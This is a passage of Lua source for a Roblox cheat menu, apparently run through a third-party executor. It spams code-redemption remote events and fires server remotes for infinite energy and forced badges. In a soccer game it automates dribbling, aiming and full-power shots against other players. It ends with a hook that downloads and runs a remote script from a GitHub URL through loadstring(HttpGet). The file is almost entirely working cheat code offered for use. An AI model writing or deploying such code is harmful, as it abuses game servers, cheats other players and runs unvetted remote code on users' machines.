			if Character.Humanoid.FloorMaterial == Enum.Material.Air and Character.HumanoidRootPart.Position.Y - Character.HumanoidRootPart.Size.Y/2 > airThreshold then
				return true
			else
				return false
			end
		end

		if game.PlaceId == 8397893574 then
			local Customize_Tab = CreateTab(Column1_Game_, "Customize", {UDim2.new(1, 0, 0.074, 100), UDim2.new(0, 77, 0, 2)})

			local Code_Spammer = ToggleTextBox(Customize_Tab, "Code Spammer", "Code")

			local Code_Spammer_Function = function()
				ToggleTransparency(Code_Spammer)
				if Code_Spammer.Button.BackgroundTransparency == 0 then
					local Event = game.Players.LocalPlayer.PlayerGui.Intro.Customize.CustomizationFrame.Codes.Redeem.LocalScript.RemoteEvent
					local Text = Code_Spammer.TextFrame.TextBox.Text
					local Runners = {
						[1] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[2] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[3] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[4] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[5] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[6] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end),
						[7] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end),
						[8] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[9] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end),
						[10] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[11] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[12] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[13] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[14] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[15] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[16] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[17] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[18] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[19] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[20] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[21] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[22] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[23] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[24] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[25] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
						[26] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end)}
					wait(5)

					for _, letter in pairs(Runners) do
						letter:Disconnect()
					end

					Code_Spammer.Button.BackgroundTransparency = 1
				end
			end

			Code_Spammer.Button.MouseButton1Click:Connect(Code_Spammer_Function)

		elseif game.PlaceId == 9822821238 then
			local Events = game:GetService("ReplicatedStorage").Events
			local Animations = game:GetService("ReplicatedStorage").Animations
			
			
			local Info = {Column1_Game_, "Goal!", {UDim2.new(0.95, 0, 0, 126), UDim2.new(0, 39, 0, 2)}, UDim2.new(0, 8, 0, 0)} --+23
			local Game_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
			local Game_Bind = CreateTab(Column1_Keybinds, Info[2], Info[3], Info[4])
			local Info = {Column1_Game_, "Badges", {UDim2.new(0.95, 0, 0, 103), UDim2.new(0, 39, 0, 2)}, UDim2.new(0, 8, 0, 0)}
			local Badge_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
			local Badge_Bind = CreateTab(Column1_Keybinds, Info[2], Info[3], Info[4])
			local Info = {Column2_Game_, "Auto Dribble", {UDim2.new(0.95, 0, 0, 80), UDim2.new(0, 101, 0, 2)}, UDim2.new(0, 8, 0, 0)}
			local AutoDribble_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
			local AutoDribble_Bind = CreateTab(Column2_Keybinds, Info[2], Info[3], Info[4])
			local Info = {Column2_Game_, "Shooting", {UDim2.new(0.95, 0, 0, 60), UDim2.new(0, 58, 0, 2)}, UDim2.new(0, 8, 0, 0)}
			local Shooting_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
			local Shooting_Bind = CreateTab(Column2_Keybinds, Info[2], Info[3], Info[4])

			local a = {}
			local b = {}
			a.Inf_Energy, b.Inf_Energy_Bind = ToggleButton(Game_Tab, "Inf Energy", Game_Bind)
			a.Quick_Queue, b.Quick_Queue_Bind = ToggleButton(Game_Tab, "Quick Queue", Game_Bind)
			a.No_Sit, b.No_Sit_Bind = ToggleButton(Game_Tab, "No Sit", Game_Bind)
			a.No_Stam_Sprint, b.No_Stam_Sprint_Bind = ToggleButton(Game_Tab, "No Stam Sprint", Game_Bind)
			a.Unlock_Camera, b.Unlock_Camera_Bind = ToggleButton(Game_Tab, "Unlock Camera", Game_Bind)

			a.Ball_Awareness, b.Ball_Awareness_Bind = ToggleButton(Badge_Tab, "Ball Awareness", Badge_Bind)
			a.CarryBall, b.CarryBall_Bind = ToggleButton(Badge_Tab, "Carry Ball", Badge_Bind)
			a.Center, b.Center_Bind = ToggleButton(Badge_Tab, "Center", Badge_Bind)
			a.FormlessShooter, b.FormlessShooter_Bind = ToggleButton(Badge_Tab, "FormlessShooter", Badge_Bind)

			a.Auto_Dribble, b.Auto_Dribble_Bind = ToggleButton(AutoDribble_Tab, "Auto Dribble", AutoDribble_Bind)
			a.Jump_Input, b.Jump_Input_Bind = ToggleButton(AutoDribble_Tab, "Jump Input", AutoDribble_Bind)
			a.Show_Step_Radius, b.Show_Step_Radius_Bind = ToggleButton(AutoDribble_Tab, "Show Step Radius", AutoDribble_Bind)

			a.Max_Power, b.Max_Power_Bind = ToggleButton(Shooting_Tab, "Max Power", Shooting_Bind)
			a.Auto_Aim, b.Auto_Aim_Bind = ToggleButton(Shooting_Tab, "Auto Aim", Shooting_Bind)
			---------------------------------------------------------------------------
			local Actual_Spots = {}
			for _, i in pairs(workspace:GetDescendants()) do
				if i.Parent.Name == "BlueSpots" or i.Parent.Name == "RedSpots" and i:FindFirstChildOfClass("ProximityPrompt") then
					table.insert(Actual_Spots, i)
				end
			end
			local function FindSpot(Character)
				local filter_table = {}

				for _, i in pairs(workspace:GetDescendants()) do
					if i.Parent.Name == "BlueSpots" or i.Parent.Name == "RedSpots" then
						if i:IsA('Part') and i:FindFirstChildOfClass("ProximityPrompt") then
							table.insert(filter_table, i)
						end
					end
				end

				local startPoint = Character.HumanoidRootPart.Position
				local closestPart = nil
				local minDistance = math.huge
				for _, part in pairs(filter_table) do
					local distance = (part.Position - startPoint).Magnitude
					if distance < minDistance then
						minDistance = distance
						closestPart = part
					end
				end

				return closestPart
			end
			F.Quick_Queue_Function = function()
				ToggleTransparency(a.Quick_Queue)

				local NearestSpot = FindSpot(Player.Character)
				while a.Quick_Queue.Button.BackgroundTransparency == 0 and not Script_Disabled do
					local Character = Player.Character
					if NearestSpot.Parent.Parent["-Scoreboard"].Timer.Txt.Text == "300" and not Player.Character.VFX.IsPlaying.Value and not Player.Character.VFX.NoMove.Value and a.Quick_Queue.Button.BackgroundTransparency ~= 1 and not Script_Disabled then
						fireproximityprompt(NearestSpot.ProximityPrompt, 1)
						a.Quick_Queue.Button.BackgroundTransparency = 1
					end
					repeat task.wait() until NearestSpot.Parent.Parent["-Scoreboard"].Timer.Txt.Text == "300" or a.Quick_Queue.Button.BackgroundTransparency == 1 or Script_Disabled
				end
			end
			---------------------------------------------------------------------------
			local Toggle = false
			local i = nil
			F.No_Stam_Sprint_Function = function(MouseLock)
				ToggleTransparency(a.No_Stam_Sprint)
				local function CheckMouseLock()
					if MouseLock then
						if UserInput.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
							return true
						else
							return false
						end
					else
						return false
					end
				end
				local Humanoid = Player.Character:WaitForChild("Humanoid")
				if not Script_Disabled and a.No_Stam_Sprint.Button.BackgroundTransparency == 0 and not Player.Character.Humanoid:FindFirstChild("Tackled") then
					if Toggle then
						Humanoid.WalkSpeed = 16
					else
						local Check = false
						if UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Player.Character:FindFirstChild("Bola") then
							Check = true
						end
						if not Check or a.CarryBall.Button.BackgroundTransparency == 0 then
							Toggle = true
							i = Instance.new("StringValue")
							i.Name = "ShiftLock"
							i.Parent = Humanoid
							task.wait()
							Humanoid.WalkSpeed = SprintSpeed
							while Toggle do
								repeat task.wait() until Humanoid.WalkSpeed ~= SprintSpeed or a.No_Stam_Sprint.Button.BackgroundTransparency ~= 0 or Script_Disabled or UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Player.Character:FindFirstChild("Bola") and not CarryBallActive or CheckMouseLock()
								if Toggle then
									a.No_Stam_Sprint.Button.BackgroundTransparency = 1
									Toggle = false
									i:Destroy()
									if Humanoid.WalkSpeed == SprintSpeed then
										Humanoid.WalkSpeed = 16
									end
								end
							end
						end
					end
				end
			end
			---------------------------------------------------------------------------
			F.No_Sit_Function = function()
				ToggleTransparency(a.No_Sit)

				while a.No_Sit.Button.BackgroundTransparency == 0 and not Script_Disabled do
					wait(0.00001)
					if not Script_Disabled then
						Player.Character.Humanoid.Sit = false
						Player.Character.VFX.NoMove.Value = false
					end
				end
			end
			---------------------------------------------------------------------------
			F.Unlock_Camera_Function = function()
				ToggleTransparency(a.Unlock_Camera)

				if a.Unlock_Camera.Button.BackgroundTransparency == 0 then
					Player.CameraMaxZoomDistance = 100
					repeat wait() until Script_Disabled or a.Unlock_Camera.Button.BackgroundTransparency == 1
					Player.CameraMaxZoomDistance = 23
				end
			end
			---------------------------------------------------------------------------
			local R = nil
			F.Inf_Energy_Function = function()
				ToggleTransparency(a.Inf_Energy)
				R = runService.RenderStepped:Connect(function() Player.PlayerGui.Check.LocalScript.RemoteEvent:FireServer(100) end)
				repeat wait() until Script_Disabled or a.Inf_Energy.Button.BackgroundTransparency == 1
				R:Disconnect()
			end
			---------------------------------------------------------------------------
			local R = nil
			F.Center_Function = function()
				ToggleTransparency(a.Center)

				if a.Center.Button.BackgroundTransparency == 0 then
					R = runService.RenderStepped:Connect(function() ChangeBadge("ArcheType3", "Center") end)
					CarryBallActive = false
					repeat wait() until Script_Disabled or a.Center.Button.BackgroundTransparency == 1
					R:Disconnect()
				end
			end
			---------------------------------------------------------------------------
			F.Ball_Awareness_Function = function()
				ToggleTransparency(a.Ball_Awareness)
			end
			if workspace:FindFirstChild("Ignore") then
				workspace.Ignore.Predict.ChildAdded:Connect(function(p8)
					if a.Ball_Awareness.Button.BackgroundTransparency == 0 and not Script_Disabled then
						p8.Transparency = 0.6
					end
				end)
			end
			---------------------------------------------------------------------------
			F.CarryBall_Function = function()
				ToggleTransparency(a.CarryBall)
			end
			---------------------------------------------------------------------------
			local R = {}
			local OriginalImage = nil
			F.FormlessShooter_Function = function()
				ToggleTransparency(a.FormlessShooter)
				if a.FormlessShooter.Button.BackgroundTransparency == 0 then
					OriginalImage = Player.PlayerGui.Layout.Badges.Slot1.Image
					Player.PlayerGui.Layout.Badges.Slot1.Image = "rbxassetid://10323892082"
					repeat wait() until Script_Disabled or a.FormlessShooter.Button.BackgroundTransparency == 1
					Player.PlayerGui.Layout.Badges.Slot1.Image = OriginalImage
				end
			end
			---------------------------------------------------------------------------
			local playerEnteredRadius = {}
			local playersInRadius = {}

			local function onPlayerEnterRadius(otherPlayer)
				table.insert(playersInRadius, otherPlayer)
			end
			local function onPlayerLeaveRadius(otherPlayer)
				table.remove(playersInRadius, table.find(playersInRadius, otherPlayer))
			end
			local function checkRadius()
				local playersInRadius = {}
				for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
					if otherPlayer ~= Player and otherPlayer.Name ~= "Blu_Mo0n" then
						local distance = (otherPlayer.Character.PrimaryPart.Position - Player.Character.PrimaryPart.Position).Magnitude
						if distance <= SlideTackleRadius then
							playersInRadius[otherPlayer] = true
							if not playerEnteredRadius[otherPlayer] then
								playerEnteredRadius[otherPlayer] = true
								onPlayerEnterRadius(otherPlayer)
							end
						else
							if playerEnteredRadius[otherPlayer] then
								playerEnteredRadius[otherPlayer] = false
								onPlayerLeaveRadius(otherPlayer)
							end
						end
					end
				end
			end
			local function FindTackleFootAnimation(Op, ID)
				for i, Track in pairs (Op.Humanoid.Animator:GetPlayingAnimationTracks()) do
					if Track.Animation.AnimationId == ID then
						return true
					end
				end
			end
			F.Auto_Dribble_Function = function()
				ToggleTransparency(a.Auto_Dribble)
				if a.Auto_Dribble.Button.BackgroundTransparency == 0 then
					local RenderStepped = runService.RenderStepped:Connect(checkRadius)

					local Dribble_Loop 
					Dribble_Loop = runService.RenderStepped:Connect(function()
						local Character = Player.Character
						if Character:FindFirstChild("Bola") and not inAir(Character) and not Character:FindFirstChild("IsDribbling") and Character.Humanoid.AutoRotate == true then
							local Ball = Player.Character.Bola
							for _, Op in ipairs(playersInRadius) do
								local op = Op.Character
								if op.Humanoid.Teammate.Value ~= Character.Humanoid.Teammate.Value and not Ball:FindFirstChild(op.Name) then
									if op.Humanoid:FindFirstChild("Tackled") or FindTackleFootAnimation(op, "rbxassetid://9015340307") and (op.HumanoidRootPart.Position - Character.HumanoidRootPart.Position).Magnitude < StepTackleRadius then
										if Character.Backpack.DribbleCounter.Value >= 1 and not UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and not inAir(Character) and CanDribble and not Character:FindFirstChild("IsDribbling") and not Character.Humanoid:FindFirstChild("Tackled") and Character.Humanoid.AutoRotate == true then
											Events.RealisticMovement:FireServer(game:GetService("Players").LocalPlayer, "V", true)

											local CD = 1.5
											if op.Humanoid:FindFirstChild("Tackled") then
												CD = 3
											end
											local Tag = Instance.new("NumberValue")
											Tag.Name = op.Name
											Tag.Parent = Ball
											Debris:AddItem(Tag, CD)
										end
									end
								end
							end
						end
						if a.Auto_Dribble.Button.BackgroundTransparency == 1 or Script_Disabled then
							Dribble_Loop:Disconnect()
							RenderStepped:Disconnect()
							playerEnteredRadius = {}
							playersInRadius = {}
						end
					end)
				end
			end
			---------------------------------------------------------------------------
			F.Jump_Input_Function = function()
				ToggleTransparency(a.Jump_Input)
			end
			---------------------------------------------------------------------------
			F.Show_Step_Radius_Function = function()
				ToggleTransparency(a.Show_Step_Radius)
				local Character = Player.Character
				if a.Show_Step_Radius.Button.BackgroundTransparency == 0 then
					local Cylinder, Weld = Instance.new('Part', Character), Instance.new('Weld', Character.HumanoidRootPart)
					Cylinder.Name = "Radius"
					Cylinder.Shape = Enum.PartType.Cylinder
					Cylinder.Size = Vector3.new(0.1, StepTackleRadius, StepTackleRadius)
					Cylinder.Anchored = false
					Cylinder.CanCollide = false
					Cylinder.Massless = true
					Cylinder.Transparency = 0.7
					Weld.Name = "Radius"
					Weld.Part0 = Weld.Parent
					Weld.Part1 = Cylinder
					Weld.C0 = CFrame.new(0, -3, 0, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1)
					while a.Show_Step_Radius.Button.BackgroundTransparency == 0 do
						local Character = Player.Character
						Cylinder.Parent = Character
						Cylinder.Size = Vector3.new(0.1, StepTackleRadius, StepTackleRadius)
						Weld.Parent = Character.HumanoidRootPart
						Weld.Part0 = Weld.Parent

						Player.CharacterAppearanceLoaded:Wait()
					end
				else
					if Character:FindFirstChild("Radius") then Character.Radius:Destroy() end
					if Character.HumanoidRootPart:FindFirstChild("Radius") then Character.HumanoidRootPart.Radius:Destroy() end
				end
			end
			---------------------------------------------------------------------------
			local Connection1 = nil
			local Connection2 = nil
			local BallConnect = nil
			local Remote = Events.M1B
			local BallCD = false
			local function StopAnimations(character, Names, og)
				local animationController = character:WaitForChild("Humanoid")
				local tracks = animationController:GetPlayingAnimationTracks()
				for _, track in pairs(tracks) do
					if table.find(Names, track.Name) and track ~= og then
						track:Stop()
					end
				end
			end

			F.Max_Power_Function = function()
				ToggleTransparency(a.Max_Power)
				if a.Max_Power.Button.BackgroundTransparency == 0 then
					BallConnect = Player.Character.ChildAdded:Connect(function(Child)
						if Child.Name == "Bola" and not BallCD then
							BallCD = true
							task.delay(2, function()
								BallCD = false
							end)
						end
					end)
					Connection1 = Mouse.Button1Down:Connect(function()
						local Character = Player.Character
						local Hum = Character.Humanoid
						if Player.Character:FindFirstChild("Bola") and not Script_Disabled then
							if inAir(Player.Character) and a.FormlessShooter.Button.BackgroundTransparency == 0 and Remote.Name ~= "Invalid" then
								CanDribble = false
								local Anim = Hum.Animator:LoadAnimation(Animations.Kick)
								Anim:Play()
								Remote.Name = "Invalid"
								Hum.AutoRotate = false
								
								local function Shoot(BodyRotate, Aim)
									spawn(function()
										wait(0.7)
										BodyRotate:Disconnect()
									end)
									spawn(function()
										wait(0.05)
										if inAir(Player.Character) then
											if Aim then
												Remote:FireServer(ShotPower, AutoAim[1], AutoAim[2], false, nil, nil, nil)
											else
												Remote:FireServer(ShotPower, Mouse.Hit, Mouse.Target, false, nil, nil, nil)
											end
										end
										wait(0.2)
										Hum.AutoRotate = true
									end)
								end
								if a.Auto_Aim.Button.BackgroundTransparency ~= 0 then -- Formless, No Auto Aim
									local BodyRotate = runService.RenderStepped:Connect(function()
										ChangeBadge("ArcheType2", "NoLook")
										local CharPos = Character.HumanoidRootPart.Position
										local MousePos = Mouse.Hit.Position
										Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(MousePos.X, CharPos.Y, MousePos.Z))
									end)
									Shoot(BodyRotate, false)
								else -- Auto Aim
									local BodyRotate = runService.RenderStepped:Connect(function()
										ChangeBadge("ArcheType2", "NoLook")
										local CharPos = Character.HumanoidRootPart.Position
										Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(AutoAim[3].X, CharPos.Y, AutoAim[3].Z))
									end)
									Shoot(BodyRotate, true)
								end
							elseif not inAir(Player.Character) and Remote.Name ~= "Invalid" and not BallCD then
								Remote.Name = "Invalid"
								CanDribble = false
								Hum.WalkSpeed = 0
								Hum.AutoRotate = false
								
								local function Shoot(BodyRotate, Aim)
									spawn(function()
										wait(0.7)
										Hum.WalkSpeed = 16
										if Character.Humanoid:FindFirstChild("ShiftLock") then Character.Humanoid.ShiftLock:Destroy() end
										BodyRotate:Disconnect()
									end)
									local Anim1 = Hum.Animator:LoadAnimation(Animations.ChargeKick)
									Anim1:Play()
									StopAnimations(Character, {"ChargeKick", "Kick"}, Anim1)
									wait(0.5)
									StopAnimations(Character, {"ChargeKick", "Kick"}, Anim1)
									spawn(function()
										wait(0.05)
										if not inAir(Player.Character) then
											local Anim2 = Hum.Animator:LoadAnimation(Animations.Kick)
											Anim2:Play()
											StopAnimations(Character, {"ChargeKick", "Kick"}, Anim2)
											if Aim then
												Remote:FireServer(ShotPower, AutoAim[1], AutoAim[2], false, nil, nil, nil)
											else
												Remote:FireServer(ShotPower, Mouse.Hit, Mouse.Target, false, nil, nil, nil)
											end
										end
										wait(0.2)
										Hum.AutoRotate = true
									end)
								end
								if a.Auto_Aim.Button.BackgroundTransparency ~= 0 then
									local BodyRotate = runService.RenderStepped:Connect(function()
										ChangeBadge("ArcheType2", "NoLook")
										local CharPos = Character.HumanoidRootPart.Position
										local MousePos = Mouse.Hit.Position
										Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(MousePos.X, CharPos.Y, MousePos.Z))
									end)
									Shoot(BodyRotate, false)
								else -- Auto Aim
									local BodyRotate = runService.RenderStepped:Connect(function()
										ChangeBadge("ArcheType2", "NoLook")
										local CharPos = Character.HumanoidRootPart.Position
										Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(AutoAim[3].X, CharPos.Y, AutoAim[3].Z))
									end)
									Shoot(BodyRotate, true)
								end
							end
						elseif Script_Disabled then
							Remote.Name = "M1B"
							Connection1:Disconnect()
							Connection2:Disconnect()
							BallConnect:Disconnect()
							Connection1 = nil
							Connection2 = nil
						end
					end)
					Connection2 = Mouse.Button1Up:Connect(function()
						wait(1.5)
						Remote.Name = "M1B"
						CanDribble = true
					end)
				else
					if Connection1 ~= nil then
						Connection1:Disconnect()
						Connection2:Disconnect()
						BallConnect:Disconnect()
						Connection1 = nil
						Connection2 = nil
					end
				end
			end
			---------------------------------------------------------------------------
			local Connection
			local Part
			F.Auto_Aim_Function = function()
				ToggleTransparency(a.Auto_Aim)
				if a.Auto_Aim.Button.BackgroundTransparency == 0 and not Script_Disabled then
					Connection = UserInput.InputBegan:Connect(function(Key, isT)
						if not isT and Key.KeyCode == Enum.KeyCode.LeftAlt and a.Auto_Aim.Button.BackgroundTransparency == 0 then
							AutoAim[1] = Mouse.Hit
							AutoAim[2] = Mouse.Target
							AutoAim[3] = Mouse.Hit.Position
							if Part then
								Part.Position = AutoAim[3]
							else
								Part = Instance.new("Part", workspace)
								Part.Anchored = true
								Part.Size = Vector3.new(2,2,2)
								Part.Material = Enum.Material.Neon
								Part.Position = AutoAim[3]
								Part.Shape = Enum.PartType.Ball
							end
						end
					end)
				else
					Part:Destroy()
					Part = nil
					Connection:Disconnect()
				end
			end
			---------------------------------------------------------------------------
			function replaceSpacesWithUnderscores(input)
				local result = ""

				for i = 1, #input do
					local char = input:sub(i, i)

					if char == " " then
						result = result .. "_"
					else
						result = result .. char
					end
				end

				return result
			end
			---------------------------------------------------------------------------
			function BindButtons(frame, funcName)
				local bindKey
				local d = true
				frame.Button.MouseButton1Click:Connect(function()
					if frame.Button.Text ~= "Press a Key" and d then
						d = false
						frame.Button.Text = "Press a Key"
						bindKey = nil

						local inputBeganConn = UserInput.InputBegan:Connect(function(key, isTyping)
							if not Script_Disabled and frame.Button.Text == "Press a Key" then
								local keyCode = tostring(key.KeyCode)
								local userInputType = tostring(key.UserInputType)
								if string.split(keyCode, ".")[3] == "Escape" or string.split(keyCode, ".")[3] == "Backspace" then
									bindKey = "Enum.KeyCode."
								elseif string.split(keyCode, ".")[3] ~= "Unknown" then
									bindKey = keyCode
								elseif string.split(userInputType, ".")[3] ~= "Unknown" then
									bindKey = userInputType
								end
								frame.Button.Text = string.split(bindKey, ".")[3]
							end
						end)

						repeat wait() until bindKey
						inputBeganConn:Disconnect()
						wait(0.05)
						d = true
					end
				end)

				UserInput.InputBegan:Connect(function(key, isTyping)
					if not Script_Disabled and not isTyping and frame.Button.Text ~= "Press a Key" and d then
						local keyCode = tostring(key.KeyCode)
						local userInputType = tostring(key.UserInputType)
						if (keyCode == bindKey) or (userInputType == bindKey) then
							if funcName == "No_Stam_Sprint" and bindKey == "Enum.UserInputType.MouseButton2" then
								if UserInput.MouseBehavior == Enum.MouseBehavior.LockCenter then
									F[funcName .. "_Function"](true)
								end
							else
								F[funcName .. "_Function"]()
							end
						end
					end
				end)
			end
			for _, i in pairs(b) do
				BindButtons(i, replaceSpacesWithUnderscores(i.Name))
			end
			---------------------------------------------------------------------------
			for _, i in pairs(a) do
				i.Button.MouseButton1Click:Connect(F[replaceSpacesWithUnderscores(i.Name).."_Function"])
			end
		end
	end
	game:GetService("Players").PlayerRemoving:Connect(function(Plr)
		if Plr == Player and not Script_Disabled then
			syn.queue_on_teleport([[
      game.Loaded:Wait()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/NotBluHub/Secured/main/Code.lua"))()
      ]])
		end
	end)
end
